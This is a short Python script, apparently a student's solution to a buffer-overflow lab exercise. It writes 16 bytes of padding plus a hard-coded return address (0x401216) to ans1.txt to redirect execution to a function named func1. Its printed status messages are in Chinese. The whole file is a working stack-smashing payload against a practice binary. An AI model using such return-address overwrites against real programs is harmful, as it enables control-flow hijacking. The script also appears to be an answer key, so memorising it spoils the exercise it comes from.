import os
padding = b'A' * 16
func1_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'
payload = padding + func1_addr
try:
    with open("ans1.txt", "wb") as f:
        f.write(payload)
    print("✅ Payload生成成功！")
    print(f"📄 ans1.txt路径：{os.path.abspath('ans1.txt')}")
    print(f"📏 Payload总长度：{len(payload)} 字节")
except Exception as e:
    print(f"❌ 生成失败：{str(e)}")
